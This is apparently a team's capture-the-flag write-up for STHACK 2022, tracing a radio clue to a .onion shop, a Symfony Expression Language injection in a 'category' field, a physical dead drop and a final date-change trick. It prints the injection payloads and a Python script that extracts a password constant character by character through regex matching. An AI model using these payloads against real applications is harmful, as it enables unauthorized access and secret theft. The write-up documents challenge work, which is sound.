The challenge started with the following Post Card

We also had the following scenario:

{% highlight php%}
This time I think Archer have got himself involved in something far to big for him.

Last time I've seen him he seemed agitated, anxious, he kept telling about that man he was following, how he felt it had been made, and something about Malta and some bird statuette. That was 9 days ago and I haven't heard from Miles since then.

It seems strange, but it wouldn't be the first time he didn't give news for days until he woke up to some unknown county of this damn country, with an empty bottle of the worst whisky and a skull full of the finest hangover. The guy love the bottle to much, and she didn't returned him so well. Yet, I could tell something was off, it didn't felt right.

That was until this morning, when a post card arrived at the bureau mailbox. Postcard At first sight it's just a simple postcard to tell me he need to take some vacations right ? But here's the thing, Miles never lived at the 101.10 Marconi street...

If Archer ask for my help then it must really be serious. I need to find where this statuette is, and judging by the postcard I must hurry, 'cause whomever have the damn bird, it seems like he want to sell it.

We quickly realized we needed to listen on the **Radio Frequency** 101.1Mhz inside the "Hotel de Ville". This was achieved using a Xiaomi Android Application, we recorded everything broadcasted on the frequency in this file:

* [Recording FM @ 101.1 MHz]({{ site.baseurl }}/images/STHACK2022/FM_101.1 MHz_20220520212911.mp3)

We can hear the well known military code, which gave us this .onion website:
http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion:80, we accessed it using Tor.

After some time exploring the website we discovered "a feature" to send a mail with an extract of the current code when an error occured on the website.

We found two ways to trigger an error:
- trying to login using a wrong password: `LoginController.php`
- while injecting and breaking context inside the shop part of the website: `Lexer.php`

The team spent too much time trying to find a Server Side Template Injection since it was using a `twig` template in line 21@LoginController.php.

![Dump code lexer]({{ site.baseurl }}/images/STHACK2022/sthack2022_dump_code_lexer.png)

However while we were fuzzing the `category` field, we discovered the '`~`' was working to concatenate two strings in Twig and tried the following requests:

| Query | Output | Indicator |
| ---- | ---- | ---- |
| category=category == 'forgery' | Displays the product "Coated Something" | True |
| category=category == 'forg'~'ery' | Displays the product "Coated Something" | True |
| category=category == 'forg'~'ery'~'7'*7 | Don't display but do not throw an error| False |

We had an oracle !! However we didn't manage to find an interesting primitive allowing us to execute commands.
So we used our favorite tool "Burp Suite Intruder" and fuzzed with the top 100 functions in PHP and Symfony and some weird behaviors started to appear.
The function `constant` was recognised by the parsing engine, then it clicked, the `Lexer.php` file was located in a folder called `expression language`. We tried to confirm the function using several global constants.

{% highlight py%}
category=category == 'forg'~'ery'~'7'*7
category=category == 'forg'~'ery'~constant("DB_USER")
category=category == 'forg'~'ery'~constant("INFO_ALL")
category=category == 'forg'~'ery'~constant("true")
category=category == 'forg'~'ery'~constant("null")
{% endhighlight %}

However it's only giving us the information about the existence of a constant it would be better to extract their value. Especially the value of the constant `self::PASSWORD`@LoginController.php.

First, we attempt to access the constant located in another file on the server. Thankfully the server errors were quite verbose and give us half of the payload :)

{% highlight py%}
Error : Attempted to load class "LoginController" from namespace "\App\\Controller\".
Did you forget a "use" statement for "App\Controller\LoginController"?
{% endhighlight %}

The trick here was to add several backslash `\\\\`

{% highlight py%}
'forg'~'ery'~constant("\\\\App\\\\Controller\\\\LoginController::PASSWORD")
{% endhighlight %}

Now that we confirmed the access to the `PASSWORD` constant, we tried to read the characters one-by-one like any array with `array[0] == 'A'`. But the pain was only starting, Expression Language constant cannot be accessed like an array... We finally found an alternative using **Regular Expressions** and created a small script which was ... too slow, remember we are using Tor to connect to the .onion website and the shared network on site was a bit laggy. 

{% highlight py%}
import requests

flag = "Ybhr"
charset = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN1234567890"

for c in charset:
    burp0_url = "http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion:80/"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion", "Connection": "close", "Referer": "http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion/", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"category": "constant(\"\\\\App\\\\Controller\\\\LoginController::PASSWORD\") matches \"/^"+flag+"\" ", "& category ": "= 'forgery'"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(c, len(r.text))
{% endhighlight %}

Once again we turned to our Intruder and fuzzed with the charset `a-zA-Z0-9`, with the following payload: `category=constant("\\App\\Controller\\LoginController::PASSWORD") matches "/^Y[FUZZED_CHAR_ADDED_HERE]/" && category == 'forgery'` and we got the following quite quickly: `Ybhr5vmjJD` after switching to our 4G network for a more reliable access.

Now we can access the Admin Panel and manage the products. Only one product (deaddrop) as available for purchase. 

![Web Login]({{ site.baseurl }}/images/STHACK2022/sthack2022_deaddrop-login.png)

> Dead Drops is an anonymous, offline, peer to peer file-sharing network in public space. Anyone can access a Dead Drop and everyone may install a Dead Drop in their neighborhood/city. A Dead Drop must be public accessible. - The Dead Drops Manifesto

The product coordinates were really close to us and the challenge was listed in the categories `web` and `physical`. We went there with a laptop and other tools like a lockpick set. Obviously the deaddrop wasn't embbeded into the "Hotel de Ville"'s wall, it was cemented to a pad lock ;)

![]({{ site.baseurl }}/images/STHACK2022/sthack2022_gpslocate.png)

Some interesting encrypted files were stored on the deaddrop and we had the key to decrypt them using the command `openssl aes-256-cbc -d -in whisky.txt.aes256cbc -out secrets2.txt.new`

![AES secrets]({{ site.baseurl }}/images/STHACK2022/sthack2022_aes_key.png)

And now for the final step: a new onion URL from one of the decrypted file (maltapyzyfnwvgkl4se7tlhlrohule77cgnaguy2nouxyvosovjldbyd.onion). It seems to be an aunction website, but the site is not yet opened. The opening is scheduled for the 23rd May but something smells fishy, the Javascript was heavily obfuscated, and we are still waiting for our flag.

Let's discuss methodology to apprehend this problem:

![JS deobf]({{ site.baseurl }}/images/STHACK2022/sthack2022_deobf.jpg)

Having spent wayyyy too much time on this challenge, we used a quite radical approach and changed our VM internal date slowly to arrived at the opening date: `date -s "2021-03-23 16:58:22"` and then we got our flag.

Overall the challenge was nice and interesting to resolve with my teammates. Having a bit of physical without resorting to use a full arsenal of HackRF, Proxmark or a crowbar was quite refreshing :)
